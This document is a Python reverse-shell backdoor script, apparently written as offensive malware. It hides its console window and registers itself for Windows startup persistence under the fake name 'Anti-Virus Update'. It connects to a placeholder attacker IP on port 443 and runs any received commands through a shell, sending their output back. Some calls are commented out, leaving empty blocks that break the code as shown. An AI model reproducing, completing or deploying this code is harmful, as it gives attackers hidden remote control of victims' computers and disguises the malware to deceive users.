
#!/usr/bin/python

# This script is not for script kiddies
# To run this script, use your little python knowledge

                    ######################################
                    ##                                  ##
                    ##   Author : Sandeep Saini         ##
                    ##        Version : v0.1rs          ##
                    ######################################
          

import sys, os, platform
import win32api, win32con, win32gui
import socket,subprocess


def hide():
    stealth=win32gui.FindWindow("ConsoleWindowClass",None)
    win32gui.ShowWindow(stealth,0)
    checkOSsystem()



def checkOSsystem():
     pro = platform.system()
     if (pro == 'Windows'):
          #add_to_registry()
     elif(pro == 'Linux'):
         #connect()
         


     
def add_to_registry():  #add to startup registry
     hkey=win32api.RegCreateKey(win32con.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
     win32api.RegSetValueEx(hkey,'Anti-Virus Update',0,win32con.REG_SZ,(os.getcwd()+"\\simple_py_shell.py"))
     win32api.RegCloseKey(hkey)
     connect()
     

def connect():
     
     HOST = 'XXX.XXX.XXX.XXX' #attacker IP address  
     PORT = 443

     global s, comm
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

     s.connect((HOST, PORT))

     s.send('[*] You have done it !\n')
     s.send('[*] So are you ready for something big ? \n')
     s.send('[*] Your time starts now......\n')

     while True:
          #gameOver()
     
     s.close()

def gameOver(): # Game over here
     
     data = s.recv(1024)
     
     comm = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    
     stdout_send = comm.stdout.read() + comm.stderr.read()
     
     s.send(stdout_send)


hide()

